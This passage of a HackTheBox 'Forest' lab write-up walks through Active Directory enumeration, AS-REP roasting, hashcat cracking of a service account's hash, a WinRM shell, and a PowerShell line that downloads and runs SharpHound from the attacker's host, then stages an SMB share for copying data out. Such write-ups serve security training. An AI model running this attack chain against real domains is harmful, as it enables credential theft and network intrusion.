+<span class="err">#</span> <span class="nt">Nmap</span> <span class="nt">done</span> <span class="nt">at</span> <span class="nt">Sat</span> <span class="nt">Sep</span> <span class="nt">26</span> <span class="nt">11</span><span class="p">:</span><span class="nd">09</span><span class="p">:</span><span class="nd">04</span> <span class="nt">2020</span> <span class="nt">--</span> <span class="nt">1</span> <span class="nt">IP</span> <span class="nt">address</span> <span class="o">(</span><span class="nt">1</span> <span class="nt">host</span> <span class="nt">up</span><span class="o">)</span> <span class="nt">scanned</span> <span class="nt">in</span> <span class="nt">17583</span><span class="p">.</span><span class="nc">00</span> <span class="nt">seconds</span>
+</pre></div>
+
+
+<p>From the above report we can deduct we are dealing with a typical Active Directory domain controller environment, since we have all the ports a typical domain uses. We also get the Windows version, that is:</p>
+<p><code>Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</code></p>
+<p><code>enum4linux</code> found the following domain users for us (through rpc anonymous authentication):</p>
+<div class="highlight"><pre><span></span><span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">Administrator</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x1f4</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">Guest</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x1f5</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">krbtgt</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x1f6</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">DefaultAccount</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x1f7</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">$331000-VK4ADACQNUCA</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x463</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_2c8eef0a09b545acb</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x464</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_ca8c2ed5bdab4dc9b</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x465</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_75a538d3025e4db9a</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x466</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_681f53d4942840e18</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x467</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_1b41c9286325456bb</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x468</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_9b69f1b9d2cc45549</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x469</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_7c96b981967141ebb</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x46a</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_c75ee099d0a64c91b</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x46b</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">SM_1ffab36a2f5f479cb</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x46c</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailboxc3d7722</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x46e</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailboxfc9daad</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x46f</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailboxc0a90c9</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x470</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailbox670628e</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x471</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailbox968e74d</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x472</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailbox6ded678</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x473</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailbox83d6781</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x474</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailboxfd87238</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x475</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailboxb01ac64</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x476</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailbox7108a4e</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x477</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">HealthMailbox0659cc1</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x478</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">sebastien</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x479</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">lucinda</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x47a</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">svc-alfresco</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x47b</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">andy</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x47e</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">mark</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x47f</span><span class="o">]</span><span class="w"></span>
+<span class="k">user</span><span class="err">:</span><span class="o">[</span><span class="n">santi</span><span class="o">]</span><span class="w"> </span><span class="nl">rid</span><span class="p">:</span><span class="o">[</span><span class="n">0x480</span><span class="o">]</span><span class="w"></span>
+</pre></div>
+
+
+<p>Other useful information was found with <code>enum4linux</code> such as domain groups, users group memberships, and so on. </p>
+<p>From the above list of users I extract the ones with common names, the ones that do not seem either default accounts or service related accounts, and put them on a file called users.txt:</p>
+<div class="highlight"><pre><span></span><span class="err">kali@kali:~/Documents/HTB/boxes/results/10.10.10.161/scans$ cat ../loot/users.txt </span>
+<span class="err">Administrator</span>
+<span class="err">andy</span>
+<span class="err">lucinda</span>
+<span class="err">mark</span>
+<span class="err">santi</span>
+<span class="err">sebastien</span>
+<span class="err">svc-alfresco</span>
+</pre></div>
+
+
+<h1 id="initial-foothold-as-rep-roasting">Initial Foothold (AS-REP Roasting)</h1>
+<p>Having a list of users is always good but without credentials we are kind of limited on what we can do. We cannot, for instance, perform a Kerberoasting attack as I did on <a href="https://sittingducks.io/Active.html">Active</a>.</p>
+<p>We can, however, attempt the <strong>AS-REP Roasting</strong> attack. For the technical details, a good article on the topic can be found <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">here</a> but there are many other online.</p>
+<p>In short, if any of the accounts in the list we have acquired have the option "Do not require Kerberos preauthentication" set in Active Directory then we will be able to get the hash of its password.</p>
+<p>Below a screenshot of the "Do not require Kerberos preauthentication" options taken from one of Domain Controllers test boxes:</p>
+<p><img alt="" src="../images/forest-preauth.png"></p>
+<p>To attempt the attack I will use <code>GetNPUsers.py</code> from the <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> suite as follows:</p>
+<div class="highlight"><pre><span></span><span class="err">GetNPUsers.py  HTB/  -usersfile ../loot/users.txt -no-pass -dc-ip 10.10.10.161</span>
+</pre></div>
+
+
+<p>where </p>
+<ul>
+<li><strong>HTB/</strong> is the domain (we obtained this info through nmap and anum4linux)</li>
+<li><strong>-usersfile ../loot/users.txt</strong> indicates the file with the list of users</li>
+<li><strong>-no-pass</strong> to use no passwords</li>
+<li><strong>-dc-ip 10.10.10.161</strong> indicates the IP of the Domain Controller</li>
+</ul>
+<p>This is the result:</p>
+<div class="highlight"><pre><span></span><span class="n">kali</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">results</span><span class="o">/</span><span class="mf">10.10.10.161</span><span class="o">/</span><span class="n">scans</span><span class="err">$</span><span class="w"> </span><span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span><span class="w">  </span><span class="n">HTB</span><span class="o">/</span><span class="w">  </span><span class="o">-</span><span class="n">usersfile</span><span class="w"> </span><span class="p">..</span><span class="o">/</span><span class="n">loot</span><span class="o">/</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="k">no</span><span class="o">-</span><span class="n">pass</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.10.161</span><span class="w"></span>
+<span class="n">Impacket</span><span class="w"> </span><span class="n">v0</span><span class="mf">.9.21</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2020</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w"></span>
+
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="n">Administrator</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="s1">[-] User andy doesn&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">UF_DONT_REQUIRE_PREAUTH</span><span class="w"> </span><span class="k">set</span><span class="w"></span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="n">lucinda</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="s1">[-] User mark doesn&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">UF_DONT_REQUIRE_PREAUTH</span><span class="w"> </span><span class="k">set</span><span class="w"></span>
+<span class="o">[</span><span class="n">-</span><span class="o">]</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="n">santi</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="s1">[-] User sebastien doesn&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">UF_DONT_REQUIRE_PREAUTH</span><span class="w"> </span><span class="k">set</span><span class="w"></span>
+<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="nv">@HTB</span><span class="err">:</span><span class="n">f7939b9120ec2a115fca89696d98cf1c</span><span class="err">$</span><span class="n">af9a4d6a30557ad75f2ce14db8f9c07c73a91a353bac0baddf7a9418560bbdeeef4c1177daace3351e71fe4929bba0a182756b370c2d5317e6f24460efea7026ab455ef9858ec1cc030ce7c4130a6cd9a0d7609f7a67f83093830bfff973685535ea65f6ca7dad17b477f12bfce0b7130022d0c9ab9cb4d024ac3716b3da2945f03dd2545cd8a4c240265f1ee465a6b1683a039dc61e4c0194d7d943f08bf3f45b1cc8c318584d4ddc6c2c1dfd6e2d83b33d0cb9002a6b585f5fa9a7f0d4c1309583e0cd8082ba25484c910e66c3fd62194a24102a3888afe62208c707f7d266</span><span class="w"></span>
+</pre></div>
+
+
+<p>We can see that we managed to get the hash for the user <strong>svc-alfresco</strong>.</p>
+<p>Let's now try to crack that hash using <code>hashcat</code>. For that we need to know the <code>hashcat</code> hash mode number. <code>hashcat</code> help page contains a list of the hash modes and knowing this is an <strong>as-rep</strong> hash I can grep the help page to obtain the mode:</p>
+<div class="highlight"><pre><span></span><span class="err">kali@kali:~/Documents/HTB/boxes/results/10.10.10.161/scans$ hashcat --help |grep -i as-rep            </span>
+<span class="err">  18200 | Kerberos 5, etype 23, AS-REP</span>
+</pre></div>
+
+
+<p>Our number is 18200. We can now attempt to crack the hash:</p>
+<div class="highlight"><pre><span></span><span class="n">kali</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">results</span><span class="o">/</span><span class="mf">10.10.10.161</span><span class="o">/</span><span class="n">loot</span><span class="err">$</span><span class="w"> </span><span class="n">hashcat</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="mi">18200</span><span class="w"> </span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="p">.</span><span class="n">hash</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="c1">--force</span>
+<span class="n">hashcat</span><span class="w"> </span><span class="p">(</span><span class="n">v6</span><span class="mf">.1.1</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="p">...</span><span class="w"></span>
+
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
+
+<span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="nv">@HTB</span><span class="err">:</span><span class="n">f7939b9120ec2a115fca89696d98cf1c</span><span class="err">$</span><span class="n">af9a4d6a30557ad75f2ce14db8f9c07c73a91a353bac0baddf7a9418560bbdeeef4c1177daace3351e71fe4929bba0a182756b370c2d5317e6f24460efea7026ab455ef9858ec</span><span class="w"></span>
+<span class="mi">1</span><span class="n">cc030ce7c4130a6cd9a0d7609f7a67f83093830bfff973685535ea65f6ca7dad17b477f12bfce0b7130022d0c9ab9cb4d024ac3716b3da2945f03dd2545cd8a4c240265f1ee465a6b1683a039dc61e4c0194d7d943f08bf3f45b1cc8c318584d4ddc6c2c1dfd</span><span class="w"></span>
+<span class="mf">6e2</span><span class="nl">d83b33d0cb9002a6b585f5fa9a7f0d4c1309583e0cd8082ba25484c910e66c3fd62194a24102a3888afe62208c707f7d266</span><span class="p">:</span><span class="n">s3rvice</span><span class="w"></span>
+
+<span class="k">Session</span><span class="p">..........</span><span class="err">:</span><span class="w"> </span><span class="n">hashcat</span><span class="w"></span>
+<span class="n">Status</span><span class="p">...........</span><span class="err">:</span><span class="w"> </span><span class="n">Cracked</span><span class="w"></span>
+<span class="n">Hash</span><span class="p">.</span><span class="n">Name</span><span class="p">........</span><span class="err">:</span><span class="w"> </span><span class="n">Kerberos</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="n">etype</span><span class="w"> </span><span class="mi">23</span><span class="p">,</span><span class="w"> </span><span class="k">AS</span><span class="o">-</span><span class="n">REP</span><span class="w"></span>
+<span class="n">Hash</span><span class="p">.</span><span class="n">Target</span><span class="p">......</span><span class="err">:</span><span class="w"> </span><span class="err">$</span><span class="n">krb5asrep</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="nv">@HTB</span><span class="err">:</span><span class="n">f7939b9120ec2a115fca</span><span class="p">...</span><span class="n">f7d266</span><span class="w"></span>
+<span class="nc">Time</span><span class="p">.</span><span class="n">Started</span><span class="p">.....</span><span class="err">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">46</span><span class="err">:</span><span class="mi">45</span><span class="w"> </span><span class="mi">2020</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="mi">4</span><span class="w"> </span><span class="n">secs</span><span class="p">)</span><span class="w"></span>
+<span class="nc">Time</span><span class="p">.</span><span class="n">Estimated</span><span class="p">...</span><span class="err">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">46</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="mi">2020</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="w"> </span><span class="n">secs</span><span class="p">)</span><span class="w"></span>
+<span class="n">Guess</span><span class="p">.</span><span class="n">Base</span><span class="p">.......</span><span class="err">:</span><span class="w"> </span><span class="k">File</span><span class="w"> </span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span><span class="w"></span>
+<span class="n">Guess</span><span class="p">.</span><span class="n">Queue</span><span class="p">......</span><span class="err">:</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="n">Speed</span><span class="p">.</span><span class="n">#1</span><span class="p">.........</span><span class="err">:</span><span class="w">  </span><span class="mf">1229.0</span><span class="w"> </span><span class="n">kH</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="p">(</span><span class="mf">6.83</span><span class="n">ms</span><span class="p">)</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="nl">Accel</span><span class="p">:</span><span class="mi">64</span><span class="w"> </span><span class="nl">Loops</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="nl">Thr</span><span class="p">:</span><span class="mi">64</span><span class="w"> </span><span class="nl">Vec</span><span class="p">:</span><span class="mi">8</span><span class="w"></span>
+<span class="n">Recovered</span><span class="p">........</span><span class="err">:</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span><span class="w"> </span><span class="n">Digests</span><span class="w"></span>
+<span class="n">Progress</span><span class="p">.........</span><span class="err">:</span><span class="w"> </span><span class="mi">4096000</span><span class="o">/</span><span class="mi">14344385</span><span class="w"> </span><span class="p">(</span><span class="mf">28.55</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="n">Rejected</span><span class="p">.........</span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="o">/</span><span class="mi">4096000</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="k">Restore</span><span class="p">.</span><span class="n">Point</span><span class="p">....</span><span class="err">:</span><span class="w"> </span><span class="mi">4079616</span><span class="o">/</span><span class="mi">14344385</span><span class="w"> </span><span class="p">(</span><span class="mf">28.44</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="k">Restore</span><span class="p">.</span><span class="n">Sub</span><span class="p">.</span><span class="n">#1</span><span class="p">...</span><span class="err">:</span><span class="w"> </span><span class="nl">Salt</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">Amplifier</span><span class="p">:</span><span class="mi">0</span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="nl">Iteration</span><span class="p">:</span><span class="mi">0</span><span class="o">-</span><span class="mi">1</span><span class="w"></span>
+<span class="n">Candidates</span><span class="p">.</span><span class="n">#1</span><span class="p">....</span><span class="err">:</span><span class="w"> </span><span class="n">s9039554h</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">s</span><span class="o">/</span><span class="n">nd</span><span class="o">/</span><span class="mi">0</span><span class="n">s</span><span class="w"></span>
+
+<span class="nl">Started</span><span class="p">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">46</span><span class="err">:</span><span class="mi">30</span><span class="w"> </span><span class="mi">2020</span><span class="w"></span>
+<span class="nl">Stopped</span><span class="p">:</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">46</span><span class="err">:</span><span class="mi">51</span><span class="w"> </span><span class="mi">2020</span><span class="w"></span>
+</pre></div>
+
+
+<p>In few seconds the hash was cracked, the password is <strong>s3rvice</strong>.</p>
+<p>At this point I had valid credentials for a user and the full nmap scan showed port 5985 is open so we can try to get a shell using <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>.</p>
+<div class="highlight"><pre><span></span><span class="n">kali</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">10.10.10.161</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;s3rvice&#39;</span><span class="w"></span>
+
+<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">v2</span><span class="mf">.3</span><span class="w"></span>
+
+<span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Establishing</span><span class="w"> </span><span class="k">connection</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">remote</span><span class="w"> </span><span class="n">endpoint</span><span class="w"></span>
+
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"></span>
+<span class="n">htb</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="w"></span>
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="p">..</span><span class="o">/</span><span class="n">Desktop</span><span class="w"></span>
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
+<span class="n">e5</span><span class="o">****************************</span><span class="n">ed</span><span class="w"></span>
+</pre></div>
+
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Given we are dealing with an Active Directory environment we could leverage <a href="https://github.com/BloodHoundAD/BloodHound">Bloodhound</a> to ease the indentification of potential attack paths. The tool is a Javascript web application which provides a graphical interpretation of the privilege relationships of an Active Directory environment. The tool also provides detailed descriptions of the relationships and the potential attack paths.</p>
+<p>From the Evil-WinRM shell previously obtained I first run <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1">SharpHound.ps1</a> which will load the compiled <strong>C#</strong> ingestor into memory:</p>
+<div class="highlight"><pre><span></span><span class="err">*Evil-WinRM* PS C:\Users\svc-alfresco\desktop&gt; IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.4/SharpHound.ps1&#39;)</span>
+</pre></div>
+
+
+<p>I then invoke BloodHound as follows:</p>
+<div class="highlight"><pre><span></span><span class="err">*Evil-WinRM* PS C:\Users\svc-alfresco\desktop&gt; Invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</span>
+</pre></div>
+
+
+<p>and after some time I can see a zip file has been generated:</p>
+<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">desktop</span><span class="o">&gt;</span> <span class="n">dir</span>
+
+
+    <span class="n">Directory</span><span class="p">:</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">desktop</span>
+
+
+<span class="k">Mode</span>                <span class="n">LastWriteTime</span>         <span class="k">Length</span> <span class="n">Name</span>
+<span class="c1">----                -------------         ------ ----</span>
+<span class="o">-</span><span class="n">a</span><span class="c1">----        9/26/2020   8:17 AM          15278 20200926081701_BloodHound.zip</span>
+<span class="o">-</span><span class="n">ar</span><span class="c1">---        9/23/2019   2:16 PM             32 user.txt</span>
+</pre></div>
+
+
+<p>To transfer the zip to my Kali box I start an SMB server on my Kali box and activate a share:</p>
+<div class="highlight"><pre><span></span><span class="n">kali</span><span class="nv">@kali</span><span class="err">:</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">results</span><span class="o">/</span><span class="mf">10.10.10.161</span><span class="o">/</span><span class="n">loot</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">smbserver</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="n">share</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">-</span><span class="n">username</span><span class="w"> </span><span class="n">m4rc0ff</span><span class="w">                                                                                                       </span>
+<span class="w"> </span><span class="o">-</span><span class="n">password</span><span class="w"> </span><span class="n">test123</span><span class="w">                                                                                    </span>
+<span class="o">[</span><span class="n">sudo</span><span class="o">]</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">kali</span><span class="p">:</span><span class="w">                                                                             </span>
+<span class="n">Impacket</span><span class="w"> </span><span class="n">v0</span><span class="mf">.9.21</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2020</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span><span class="w">                                                                                                                                                     </span>
+
